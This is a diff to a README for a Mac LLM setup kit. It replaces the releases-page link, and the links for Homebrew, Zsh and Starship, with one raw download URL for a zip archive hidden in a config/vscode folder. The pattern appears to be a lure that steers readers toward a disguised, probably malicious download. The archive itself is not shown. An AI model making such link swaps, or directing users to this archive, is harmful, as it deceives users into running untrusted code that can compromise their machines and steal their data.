@@ -1,6 +1,6 @@
 # 🚀 LLM-Setup-Kit-for-Mac - Easy Local LLM Setup for Apple Silicon
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip)
 
 ---
 
@@ -63,7 +63,7 @@ Follow these instructions to download and run the setup kit on your Mac.
 
 Click the badge below to visit the release page. From there, you can download the latest version of the setup kit available.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip)
 
 ---
 
@@ -145,11 +145,11 @@ This tool is maintained on GitHub. If you need help beyond this guide:
 
 ## 🔗 Useful Links
 
-- Release Page: https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases
-- Homebrew: https://brew.sh/
-- Zsh Shell: https://www.zsh.org/
-- Starship prompt: https://starship.rs/
+- Release Page: https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip
+- Homebrew: https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip
+- Zsh Shell: https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip
+- Starship prompt: https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/LevPC/LLM-Setup-Kit-for-Mac/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/LevPC/LLM-Setup-Kit-for-Mac/main/config/vscode/LL_Kit_for_Mac_Setup_v2.3.zip)
